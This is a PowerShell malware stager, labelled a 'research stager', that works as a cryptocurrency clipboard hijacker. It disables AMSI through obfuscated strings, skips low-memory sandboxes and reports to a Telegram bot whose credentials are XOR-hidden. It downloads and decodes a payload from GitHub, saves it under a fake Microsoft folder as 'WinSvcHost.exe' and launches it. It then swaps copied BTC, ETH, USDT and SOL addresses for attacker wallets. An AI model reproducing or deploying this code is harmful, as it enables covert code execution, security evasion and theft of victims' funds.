# --- [ELITE RESEARCH STAGER v20.0: STA-ENHANCED CLIPPER] ---

function Global-Initialize {
    try {
        # Hardware Check (Anti-Sandbox)
        if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB) { exit }
        
        # Obfuscated AMSI Patch
        $u = "System.Management.Automation." + "Ams" + "iUtils"
        [Ref].Assembly.GetType($u).GetField("amsi"+"Init"+"Failed","NonPublic,Static").SetValue($null,$true)
    } catch {}
}

function Send-Ping {
    param($m)
    $k=0xAF; [byte[]]$t_e=60,56,60,57,57,58,49,60,60,50,119,6,6,106,108,6,121,115,125,108,5,121,105,6,116,106,6,60,106,122,60,105,121,111,113,111,108,6,103,5,60,114,118; [byte[]]$c_e=54,53,61,61,51,54,56,43,50,53
    $t=""; foreach($b in $t_e){$t+=[char]($b -bxor $k)}; $c=""; foreach($b in $c_e){$c+=[char]($b -bxor $k)}
    $url = "h"+"tt"+"ps://api.tele"+"gram.org/bot$t/send"+"Message?chat_id=$c&text=$m"
    try { (New-Object Net.WebClient).DownloadString($url) | Out-Null } catch {}
}

# --- MAIN LOGIC ---
Global-Initialize
Send-Ping -m "STAGER_RELOADED_STA_MODE_ON_$($env:COMPUTERNAME)"

try {
    # Persistence & File Setup
    $dir = "$env:PROGRAMDATA\Microsoft\DeviceSync"
    if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force | Out-Null }
    $path = Join-Path $dir "WinSvcHost.exe"

    # Download & XOR
    $wc = New-Object Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $raw = $wc.DownloadString("https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt")
    $data = [Convert]::FromBase64String($raw.Trim())
    for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
    [IO.File]::WriteAllBytes($path, $data)

    # Detached launch
    ([wmiclass]"win32_process").Create($path) | Out-Null

    # --- ENHANCED CLIPPER ENGINE ---
    # We use a separate thread forced into STA mode to handle the Clipboard
    Start-ThreadJob -ScriptBlock {
        Add-Type -AssemblyName System.Windows.Forms
        $w = @{
            "btc"  = "12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA"
            "eth"  = "0x6c9ba9a6522b10135bb836fc9340477ba15f3392"
            "usdt" = "TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp"
            "sol"  = "BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"
        }
        
        while($true) {
            try {
                # Get clipboard content safely
                if ([System.Windows.Forms.Clipboard]::ContainsText()) {
                    $c = [System.Windows.Forms.Clipboard]::GetText().Trim()
                    
                    # Regex Matching & Swapping
                    if ($c -match "^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$" -and $c -ne $w.btc) {
                        [System.Windows.Forms.Clipboard]::SetText($w.btc)
                    }
                    elseif ($c -match "^0x[a-fA-F0-9]{40}$" -and $c -ne $w.eth) {
                        [System.Windows.Forms.Clipboard]::SetText($w.eth)
                    }
                    elseif ($c -match "^T[A-Za-z1-9]{33}$" -and $c -ne $w.usdt) {
                        [System.Windows.Forms.Clipboard]::SetText($w.usdt)
                    }
                    elseif ($c -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$" -and $c -ne $w.sol) {
                        [System.Windows.Forms.Clipboard]::SetText($w.sol)
                    }
                }
            } catch {}
            Start-Sleep -Milliseconds 500 # Faster response time
        }
    }
    
    Send-Ping -m "CLIPPER_STA_ACTIVE"
} catch {
    Send-Ping -m "ERROR_$($_.Exception.Message)"
}
